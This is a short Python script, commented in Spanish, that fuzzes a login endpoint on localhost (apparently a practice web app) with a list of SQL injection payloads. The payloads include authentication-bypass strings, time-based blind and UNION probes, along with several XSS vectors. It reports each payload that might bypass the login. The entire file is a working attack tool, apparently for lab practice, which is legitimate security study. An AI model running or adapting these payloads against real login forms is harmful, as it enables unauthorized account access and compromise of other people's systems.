import requests

url = 'http://localhost:3000/rest/user/login'
payloads = [
    "admin",                      # Control válido
    "' OR 1=1--",                # SQLi clásico bypass
    "' OR '1'='1' --",           # Variante SQLi
    "' OR '1'='1' /*",           # Variante SQLi con comentario
    "' OR 1=1#",                 # SQLi con comentario #
    "' OR ''='",                 # SQLi con cadena vacía
    "admin' --",                 # SQLi para cortar query
    "<script>alert(1)</script>", # XSS reflejado
    "'><script>alert(1)</script>",# XSS con cierre de etiqueta
    "<img src=x onerror=alert(1)>",# XSS con evento onerror
    "' OR 1=1 LIMIT 1--",        # SQLi con límite
    "' OR sleep(5)--",           # SQLi Blind con delay
    "' OR benchmark(1000000,MD5(1))--", # SQLi con benchmark (MySQL)
    "' OR 'x'='x",               # SQLi simple
    "' OR 1=1;--",               # SQLi terminador de sentencia
    "' UNION SELECT NULL--",     # SQLi union select
]

for payload in payloads:
    headers = {
        "Content-Type" : "application/json"
    }

    data = {
        "email": payload,
        "password": "admin"
    }

    # r = requests.post(url, data=data)
    r = requests.post(url, headers=headers, json=data)

    # El texto, debe ser reemplazado de acuerdo al contexto
    if "Invalid email or password." not in r.text:
        print(f"[+] Posible bypass con: {payload}")
    else:
        print(f"[-] Falló con: {payload}")


